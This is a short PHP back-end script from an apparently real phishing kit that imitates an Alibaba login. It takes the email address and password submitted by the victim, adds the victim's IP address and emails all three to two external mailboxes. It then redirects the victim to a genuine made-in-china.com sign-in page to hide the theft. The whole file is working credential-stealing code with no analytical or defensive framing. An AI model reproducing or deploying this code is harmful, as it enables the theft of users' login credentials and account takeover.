<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Alibaba Login -----------------------\n";
$message .= "Email ID: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['Password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By BJ ------------------------------\n";
$recipient = "jesus.chirst@yandex.com,a.knaub.bargain24@gmail.com";
$subject = "Alibaba Login";
$headers = "Ali-rESULTZ@boss.com";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "Ali Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://login.made-in-china.com/sign-in/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>